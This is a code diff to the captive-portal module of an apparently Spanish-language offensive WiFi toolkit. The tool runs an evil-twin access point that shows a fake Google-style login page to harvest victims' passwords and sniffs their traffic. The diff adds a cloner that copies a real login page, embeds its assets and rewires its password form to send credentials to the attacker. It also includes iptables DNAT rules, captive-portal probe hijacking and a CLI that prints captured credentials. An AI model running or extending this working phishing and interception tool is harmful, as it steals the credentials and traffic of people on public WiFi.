@@ -4,8 +4,8 @@ core/captive_portal.py
 Módulo de Captive Portal (Evil Twin Público)
 -------------------------------------------
 Simula una red WiFi pública de tipo "FreeMallWiFi" que al conectarse
-muestra una página de login (estilo Google o venue) para capturar
-credenciales del usuario.
+muestra una página de login (estilo Google o plantilla personalizada
+clonada de una URL real) para capturar credenciales del usuario.
 
 Tras el login, la víctima recibe internet real via NAT (eth0 u otra
 interfaz de salida). Simultáneamente se activa el sniffer de tráfico
@@ -28,6 +28,7 @@ Stack técnico:
 
 Requisitos en Kali:
   sudo apt install hostapd dnsmasq python3-flask python3-scapy
+  pip install requests beautifulsoup4
   (la interfaz debe estar en modo managed, NO en monitor)
 """
 
@@ -37,7 +38,10 @@ import os
 import sys
 import time
 import json
+import base64
+import mimetypes
 from datetime import datetime
+from urllib.parse import urljoin, urlparse
 
 WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.insert(0, WIRETRAP_DIR)
@@ -111,7 +115,7 @@ _PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
     <span class="G">G</span><span class="o1">o</span><span class="o2">o</span><span class="g">g</span><span class="l">l</span><span class="e">e</span>
   </div>
   <h2>Iniciar sesión</h2>
-  <p class="sub">para continuar en {{ venue }}</p>
+  <p class="sub">para continuar en la red WiFi</p>
   <div class="info-bar">
     🔒 Conexión gratuita a la red WiFi pública.
     Se requiere autenticación para acceder a Internet.
@@ -127,68 +131,6 @@ _PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
     </div>
   </form>
   <div class="footer">Español (España) • Ayuda • Privacidad • Términos</div>
-</div>
-</body>
-</html>
-"""
-
-_PORTAL_HTML_VENUE = """<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>{{ venue }} WiFi – Acceso Gratuito</title>
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: 'Segoe UI', Arial, sans-serif;
-    background: linear-gradient(135deg,#1a1a2e,#16213e);
-    display: flex; align-items: center; justify-content: center; min-height: 100vh;
-  }
-  .card { background: white; border-radius: 12px;
-    box-shadow: 0 4px 24px rgba(0,0,0,.4); width: 380px; padding: 40px; }
-  h1 { font-size: 22px; color: #1a1a2e; text-align: center; margin-bottom: 6px; }
-  p.sub { color: #666; font-size: 13px; text-align: center; margin-bottom: 28px; }
-  label { font-size: 13px; color: #333; font-weight: 600; display: block; margin-bottom: 6px; }
-  input[type=email], input[type=password] {
-    width:100%; border:1px solid #ddd; border-radius:6px;
-    padding:12px 14px; font-size:14px; margin-bottom:18px;
-  }
-  input:focus { outline:none; border-color:#4285F4; }
-  .btn-access {
-    width:100%; background:#e94560; color:white; border:none;
-    border-radius:6px; padding:13px; font-size:15px; font-weight:600; cursor:pointer;
-  }
-  .btn-access:hover { background:#c73652; }
-  .wifi-icon { font-size:40px; text-align:center; margin-bottom:20px; }
-  .terms { font-size:11px; color:#999; text-align:center; margin-top:18px; }
-  .divider { border:none; border-top:1px solid #eee; margin:20px 0; }
-  .social-btn {
-    width:100%; border:1px solid #ddd; background:white;
-    border-radius:6px; padding:11px; font-size:14px;
-    cursor:pointer; display:flex; align-items:center; gap:10px; margin-bottom:10px;
-  }
-</style>
-</head>
-<body>
-<div class="card">
-  <div class="wifi-icon">📶</div>
-  <h1>{{ venue }} – WiFi Gratis</h1>
-  <p class="sub">Inicia sesión para navegar sin límites</p>
-  <form method="POST" action="/login">
-    <label>Email o teléfono</label>
-    <input name="email" type="email" placeholder="usuario@ejemplo.com" required autofocus>
-    <label>Contraseña</label>
-    <input name="password" type="password" placeholder="••••••••" required>
-    <button class="btn-access" type="submit">🔓 Acceder a Internet</button>
-  </form>
-  <hr class="divider">
-  <button class="social-btn">
-    <img src="https://www.google.com/favicon.ico" width="18" onerror="this.style.display='none'">
-    Continuar con Google
-  </button>
-  <button class="social-btn">📘 Continuar con Facebook</button>
-  <div class="terms">Al conectarte aceptas nuestros <a href="#">Términos y Condiciones</a>.</div>
 </div>
 </body>
 </html>
@@ -221,22 +163,231 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
 """
 
 
+# ── Clonador de páginas de login ─────────────────────────────────
+
+def clone_login_page(url: str, log_fn=None) -> str:
+    """
+    Descarga la página de login indicada por 'url' y devuelve un HTML
+    autocontenido con todos los recursos (CSS, imágenes, fuentes, JS)
+    incrustados como data-URI en base64.
+
+    El HTML resultante se modifica para que:
+      - El primer <form> con campos de password apunte a POST /login
+      - Los campos del form se renombren a "email" y "password"
+        (para que Flask los capture igual que en la plantilla Google)
+
+    Args:
+        url: URL de una página de login real (p.ej. login de McDonalds WiFi)
+        log_fn: función opcional para recibir mensajes de progreso
+
+    Returns:
+        str con el HTML autocontenido, o "" si falla
+    """
+    def _log(msg):
+        if log_fn:
+            log_fn(msg)
+
+    try:
+        import requests
+        from bs4 import BeautifulSoup
+    except ImportError:
+        _log("[!] Faltan dependencias: pip install requests beautifulsoup4")
+        return ""
+
+    headers = {
+        "User-Agent": (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/120.0.0.0 Safari/537.36"
+        ),
+        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    }
+
+    session = requests.Session()
+    session.headers.update(headers)
+    session.verify = False  # portales WiFi tienen certs autofirmados
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    # ── 1. Descargar HTML principal ──────────────────────────────
+    _log(f"[*] Descargando página: {url}")
+    try:
+        resp = session.get(url, timeout=15, allow_redirects=True)
+        resp.raise_for_status()
+        final_url = resp.url
+    except Exception as e:
+        _log(f"[!] Error descargando {url}: {e}")
+        return ""
+
+    encoding = resp.encoding or "utf-8"
+    try:
+        html_text = resp.content.decode(encoding, errors="replace")
+    except Exception:
+        html_text = resp.text
+
+    soup = BeautifulSoup(html_text, "html.parser")
+    _log(f"[*] Página descargada ({len(html_text)} bytes). Base URL: {final_url}")
+
+    # ── 2. Función auxiliar: descargar recurso → data URI ────────
+    def _resource_to_data_uri(href, base_url):
+        abs_url = urljoin(base_url, href)
+        # Sólo recursos HTTP/HTTPS
+        scheme = urlparse(abs_url).scheme
+        if scheme not in ("http", "https"):
+            return None
+        try:
+            r = session.get(abs_url, timeout=10, allow_redirects=True)
+            if r.status_code != 200:
+                return None
+            content_type = r.headers.get("Content-Type", "").split(";")[0].strip()
+            if not content_type:
+                # Adivinar por extensión
+                ext = os.path.splitext(urlparse(abs_url).path)[1].lower()
+                content_type = mimetypes.types_map.get(ext, "application/octet-stream")
+            b64 = base64.b64encode(r.content).decode("ascii")
+            return f"data:{content_type};base64,{b64}"
+        except Exception:
+            return None
+
+    # ── 3. Inlinar CSS externos ──────────────────────────────────
+    for tag in soup.find_all("link", rel=lambda v: v and "stylesheet" in v):
+        href = tag.get("href", "")
+        if not href or href.startswith("data:"):
+            continue
+        _log(f"  [css] {href[:80]}")
+        data_uri = _resource_to_data_uri(href, final_url)
+        if data_uri:
+            new_style = soup.new_tag("style")
+            # Descargar el CSS y resolver sus url() también
+            try:
+                abs_url = urljoin(final_url, href)
+                css_resp = session.get(abs_url, timeout=10)
+                css_text = css_resp.text
+                # Reemplazar url(...) dentro del CSS con data URIs
+                import re as _re
+                def _replace_css_url(m):
+                    raw = m.group(1).strip("'\" ")
+                    if raw.startswith("data:"):
+                        return m.group(0)
+                    d = _resource_to_data_uri(raw, abs_url)
+                    return f"url({d})" if d else m.group(0)
+                css_text = _re.sub(r"url\(([^)]+)\)", _replace_css_url, css_text)
+                new_style.string = css_text
+            except Exception:
+                new_style.string = f"/* could not inline {href} */"
+            tag.replace_with(new_style)
+
+    # ── 4. Inlinar imágenes (<img src=>) ─────────────────────────
+    for tag in soup.find_all("img"):
+        src = tag.get("src", "")
+        if not src or src.startswith("data:"):
+            continue
+        _log(f"  [img] {src[:80]}")
+        data_uri = _resource_to_data_uri(src, final_url)
+        if data_uri:
+            tag["src"] = data_uri
+
+    # ── 5. Inlinar fuentes y otros recursos en <style> inline ────
+    import re as _re
+    for style_tag in soup.find_all("style"):
+        if style_tag.string:
+            def _replace_css_url2(m):
+                raw = m.group(1).strip("'\" ")
+                if raw.startswith("data:"):
+                    return m.group(0)
+                d = _resource_to_data_uri(raw, final_url)
+                return f"url({d})" if d else m.group(0)
+            style_tag.string = _re.sub(r"url\(([^)]+)\)", _replace_css_url2, style_tag.string)
+
+    # ── 6. Inlinar atributos background/style inline ─────────────
+    for tag in soup.find_all(style=True):
+        style_val = tag["style"]
+        def _replace_inline(m):
+            raw = m.group(1).strip("'\" ")
+            if raw.startswith("data:"):
+                return m.group(0)
+            d = _resource_to_data_uri(raw, final_url)
+            return f"url({d})" if d else m.group(0)
+        tag["style"] = _re.sub(r"url\(([^)]+)\)", _replace_inline, style_val)
+
+    # ── 7. Adaptar el formulario para capturar credenciales ───────
+    # Buscar el form que tenga input[type=password]
+    target_form = None
+    for form in soup.find_all("form"):
+        if form.find("input", {"type": "password"}):
+            target_form = form
+            break
+
+    if target_form:
+        target_form["method"] = "POST"
+        target_form["action"] = "/login"
+        # Renombrar el primer campo de texto/email → "email"
+        email_input = (target_form.find("input", {"type": "email"})
+                       or target_form.find("input", {"type": "text"})
+                       or target_form.find("input", {"type": "tel"}))
+        if email_input:
+            email_input["name"] = "email"
+        # Renombrar el campo password → "password"
+        pwd_input = target_form.find("input", {"type": "password"})
+        if pwd_input:
+            pwd_input["name"] = "password"
+        _log("[+] Formulario adaptado → POST /login (email, password)")
+    else:
+        # No encontró form con password: inyectar uno encima del body
+        _log("[!] No se encontró form con password; inyectando overlay de login")
+        overlay_html = """
+<div id="wt-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,0.7);z-index:99999;display:flex;align-items:center;
+  justify-content:center;">
+  <div style="background:white;border-radius:8px;padding:40px;width:340px;text-align:center;
+    box-shadow:0 4px 24px rgba(0,0,0,0.5);">
+    <h2 style="margin-bottom:16px;font-size:20px;color:#333;">Inicia sesión para continuar</h2>
+    <form method="POST" action="/login">
+      <input name="email" type="email" placeholder="Correo electrónico" required
+        style="width:100%;padding:10px;margin-bottom:12px;border:1px solid #ccc;
+               border-radius:4px;font-size:14px;">
+      <input name="password" type="password" placeholder="Contraseña" required
+        style="width:100%;padding:10px;margin-bottom:16px;border:1px solid #ccc;
+               border-radius:4px;font-size:14px;">
+      <button type="submit"
+        style="width:100%;background:#1a73e8;color:white;border:none;border-radius:4px;
+               padding:11px;font-size:15px;cursor:pointer;">Acceder</button>
+    </form>
+  </div>
+</div>"""
+        body = soup.find("body")
+        if body:
+            body.insert(0, BeautifulSoup(overlay_html, "html.parser"))
+
+    # ── 8. Eliminar scripts externos (pueden romper el portal) ────
+    for tag in soup.find_all("script", src=True):
+        tag.decompose()
+
+    # ── 9. Quitar <base> tags que redirigirían recursos externos ──
+    for tag in soup.find_all("base"):
+        tag.decompose()
+
+    _log("[+] Clonación completada")
+    return str(soup)
+
+
 # ── Flask app ────────────────────────────────────────────────────
 
-def _build_flask_app(gateway_ip, template_type, venue_name, creds_log,
+def _build_flask_app(gateway_ip, template_type, creds_log,
+                     custom_html=None,
                      on_credential=None, on_client_login=None):
     """
     Construye la app Flask del portal.
+
+    template_type: "google" | "custom"
+    custom_html:   HTML clonado (solo cuando template_type == "custom")
 
     Incluye rutas de detección para cada SO:
       - iOS/macOS: /hotspot-detect.html, /library/test/success.html
       - Android:   /generate_204, /gen_204, /connectivitycheck
       - Windows:   /connecttest.txt, /ncsi.txt
       - Firefox:   /canonical.html
-
-    Estas rutas devuelven 302 al portal en lugar de la respuesta
-    esperada, lo que hace que el OS detecte un portal cautivo y
-    abra el popup automáticamente.
     """
     try:
         from flask import Flask, request, make_response, redirect
@@ -246,15 +397,14 @@ def _build_flask_app(gateway_ip, template_type, venue_name, creds_log,
     app = Flask(__name__)
     app.secret_key = os.urandom(16)
 
-    portal_html = (_PORTAL_HTML_GOOGLE if template_type == "google"
-                   else _PORTAL_HTML_VENUE).replace("{{ venue }}", venue_name)
+    if template_type == "custom" and custom_html:
+        portal_html = custom_html
+    else:
+        portal_html = _PORTAL_HTML_GOOGLE
 
     portal_url = f"http://{gateway_ip}/"
 
     # ── Rutas de detección OS (OS Captive Portal Probes) ──────────
-    # Devolver 302 en lugar de la respuesta esperada hace que el OS
-    # detecte el portal y muestre el popup de autenticación.
-
     @app.route("/hotspot-detect.html")
     @app.route("/library/test/success.html")
     @app.route("/hotspot-detect")
@@ -332,8 +482,8 @@ class CaptivePortal:
 
         self.ssid          = "FreeWiFi"
         self.channel       = 6
-        self.venue_name    = "Portal WiFi"
         self.template_type = "google"
+        self.custom_html   = ""       # HTML clonado (usado si template_type=="custom")
 
         self.captured_creds  = []
         self._logged_in_ips  = set()
@@ -369,6 +519,25 @@ class CaptivePortal:
     def _hw_mode(channel):
         return "a" if channel >= 36 else "g"
 
+    # ── Clonación de plantilla personalizada ─────────────────────
+
+    def clone_template(self, url: str) -> bool:
+        """
+        Clona la página de login en 'url' y la guarda en self.custom_html.
+        Retorna True si tuvo éxito, False si falló.
+        Puede llamarse desde la GUI antes de start().
+        """
+        self._log(f"[*] Iniciando clonación de: {url}")
+        html = clone_login_page(url, log_fn=self._log)
+        if html:
+            self.custom_html = html
+            self.template_type = "custom"
+            self._log(f"[+] Plantilla clonada OK ({len(html)} bytes)")
+            return True
+        else:
+            self._err("No se pudo clonar la plantilla.")
+            return False
+
     # ── Configuraciones ──────────────────────────────────────────
 
     def _write_hostapd_conf(self):
@@ -396,13 +565,8 @@ class CaptivePortal:
             f"dhcp-range={DHCP_START},{DHCP_END},{SUBNET_MASK},5m\n"
             f"dhcp-option=3,{GATEWAY_IP}\n"
             f"dhcp-option=6,{GATEWAY_IP}\n"
-            # DHCP option 114: RFC 7710 — Captive Portal URL
-            # iOS 14+ y algunos Android lo usan para abrir el popup
-            # sin necesidad de hacer el HTTP probe
             f"dhcp-option=114,http://{GATEWAY_IP}/\n"
             f"address=/#/{GATEWAY_IP}\n"
-            # TTL=0: evita que el OS cachee la resolución DNS del portal
-            # Crítico para que el popup aparezca en reconexiones
             f"local-ttl=0\n"
             f"log-dhcp\n"
             f"no-resolv\n"
@@ -433,7 +597,6 @@ class CaptivePortal:
         subprocess.run(["iptables", "-F"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
 
-        # INPUT: permitir servicios locales del portal
         subprocess.run(["iptables", "-A", "INPUT", "-i", "lo", "-j", "ACCEPT"],
                        capture_output=True)
         subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
@@ -443,7 +606,6 @@ class CaptivePortal:
         subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                         "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], capture_output=True)
 
-        # PREROUTING: redirigir HTTP y HTTPS al Flask portal
         subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                         "-i", iface, "-p", "tcp", "--dport", "80",
                         "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
@@ -453,13 +615,10 @@ class CaptivePortal:
                         "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
                        capture_output=True)
 
-        # FORWARD: permitir paquetes de conexiones ya establecidas
-        # (necesario para que el NAT funcione cuando se conceda internet)
         subprocess.run(["iptables", "-A", "FORWARD",
                         "-m", "conntrack", "--ctstate", "ESTABLISHED,RELATED",
                         "-j", "ACCEPT"], capture_output=True)
 
-        # FORWARD: bloquear todo lo demás (sin internet hasta el login)
         subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
 
@@ -479,12 +638,9 @@ class CaptivePortal:
         iface  = self.interface
         out_if = self.out_interface
 
-        # 1. Eliminar DROP genérico de FORWARD (lo re-añadimos al final)
         subprocess.run(["iptables", "-D", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
 
-        # 2. FIX DNS: redirigir consultas DNS de esta IP al upstream real
-        #    Insertar en posición 1 (antes del DNAT del portal)
         subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
                         "-i", iface, "-s", client_ip,
                         "-p", "udp", "--dport", "53",
@@ -496,8 +652,6 @@ class CaptivePortal:
                         "-j", "DNAT", f"--to-destination={UPSTREAM_DNS}:53"],
                        capture_output=True)
 
-        # 3. Excluir esta IP del DNAT HTTP/HTTPS al portal
-        #    RETURN en lugar de ACCEPT para que siga procesando (NAT saliente)
         subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
                         "-i", iface, "-s", client_ip,
                         "-p", "tcp", "--dport", "80", "-j", "RETURN"],
@@ -507,7 +661,6 @@ class CaptivePortal:
                         "-p", "tcp", "--dport", "443", "-j", "RETURN"],
                        capture_output=True)
 
-        # 4. Permitir FORWARD para esta IP (bidireccional)
         subprocess.run(["iptables", "-I", "FORWARD", "1",
                         "-i", iface, "-s", client_ip,
                         "-o", out_if, "-j", "ACCEPT"],
@@ -517,16 +670,13 @@ class CaptivePortal:
                         "-o", iface, "-j", "ACCEPT"],
                        capture_output=True)
 
-        # 5. Re-añadir DROP al final (nuevas víctimas siguen sin internet)
         subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
 
-        # 6. NAT saliente para esta IP
         subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                         "-s", client_ip, "-o", out_if, "-j", "MASQUERADE"],
                        capture_output=True)
 
-        # 7. Permitir que el DNS forwarded (ahora a 8.8.8.8) pueda salir
         subprocess.run(["iptables", "-I", "FORWARD", "1",
                         "-i", iface, "-s", client_ip,
                         "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
@@ -597,8 +747,8 @@ class CaptivePortal:
         app = _build_flask_app(
             gateway_ip=GATEWAY_IP,
             template_type=self.template_type,
-            venue_name=self.venue_name,
             creds_log=self.captured_creds,
+            custom_html=self.custom_html if self.template_type == "custom" else None,
             on_credential=self._on_new_credential,
             on_client_login=self._on_client_login
         )
@@ -610,8 +760,6 @@ class CaptivePortal:
             try:
                 import logging as _lg
                 _lg.getLogger("werkzeug").setLevel(_lg.ERROR)
-                # 0.0.0.0 en lugar de GATEWAY_IP para recibir peticiones
-                # a cualquier hostname que dnsmasq resuelva a GATEWAY_IP
                 app.run(host="0.0.0.0", port=FLASK_PORT,
                         threaded=True, use_reloader=False, debug=False)
             except Exception as ex:
@@ -665,17 +813,18 @@ class CaptivePortal:
     # ── API pública ──────────────────────────────────────────────
 
     def start(self, ssid="FreeWiFi", channel=6,
-              template="google", venue="Portal WiFi",
-              out_interface="eth0"):
+              template="google", out_interface="eth0"):
         """
         Arranca el ataque completo.
 
         Args:
             ssid:          SSID del AP falso (p.ej. "MallWiFi_FREE")
             channel:       Canal 802.11 (1-13 para 2.4 GHz)
-            template:      "google" | "venue"
-            venue:         Nombre del lugar en la página de login
+            template:      "google" | "custom"
             out_interface: Interfaz con internet real (eth0, wlan1...)
+
+        Nota: si template=="custom", llama primero a clone_template(url)
+        para preparar self.custom_html antes de start().
         """
         if self.running:
             self._log("Ya está en ejecución.")
@@ -684,7 +833,6 @@ class CaptivePortal:
         self.ssid          = ssid
         self.channel       = max(1, min(13, int(channel)))
         self.template_type = template
-        self.venue_name    = venue
         self.out_interface = out_interface
         self.captured_creds.clear()
         self._logged_in_ips.clear()
@@ -694,8 +842,12 @@ class CaptivePortal:
         self._log(f"  SSID      : {self.ssid}")
         self._log(f"  Canal     : {self.channel}")
         self._log(f"  Plantilla : {self.template_type}")
-        self._log(f"  Venue     : {self.venue_name}")
         self._log(f"  Internet  : {self.out_interface}")
+
+        if template == "custom" and not self.custom_html:
+            self._err("Plantilla personalizada seleccionada pero no se ha clonado ninguna URL. "
+                      "Usa 'Clonar Plantilla' antes de iniciar.")
+            return
 
         self._write_hostapd_conf()
         self._write_dnsmasq_conf()
@@ -776,13 +928,15 @@ class CaptivePortal:
 
 if __name__ == "__main__":
     if len(sys.argv) < 3:
-        print("Uso: sudo python3 captive_portal.py <iface_ap> <iface_internet> [ssid]")
+        print("Uso: sudo python3 captive_portal.py <iface_ap> <iface_internet> [ssid] [url_a_clonar]")
         print("Ejemplo: sudo python3 captive_portal.py wlan0 eth0 MallWiFi_FREE")
+        print("         sudo python3 captive_portal.py wlan0 eth0 McDoWiFi https://example.com/login")
         sys.exit(1)
 
     iface  = sys.argv[1]
     out_if = sys.argv[2]
     ssid   = sys.argv[3] if len(sys.argv) > 3 else "MallWiFi_FREE"
+    clone_url = sys.argv[4] if len(sys.argv) > 4 else None
 
     cp = CaptivePortal(iface)
     cp.on_log        = lambda m: print(f"[LOG] {m}")
@@ -790,13 +944,16 @@ if __name__ == "__main__":
     cp.on_credential = lambda e: print(f"\n[!!!] CAPTURADO: {e}\n")
     cp.on_sniff_data = lambda d: print(f"[SNIFF] {d.data_type} {d.source_ip} {d.value[:60]}")
 
-    cp.start(ssid=ssid, channel=6, template="google",
-             venue="Centro Comercial", out_interface=out_if)
+    if clone_url:
+        if not cp.clone_template(clone_url):
+            sys.exit(1)
+        cp.start(ssid=ssid, channel=6, template="custom", out_interface=out_if)
+    else:
+        cp.start(ssid=ssid, channel=6, template="google", out_interface=out_if)
 
     try:
         while cp.running:
             time.sleep(1)
     except KeyboardInterrupt:
+        print("\n[*] Deteniendo...")
         cp.stop()
-        if cp.captured_creds:
-            print(f"\nCredenciales guardadas en: {cp.export_credentials()}")
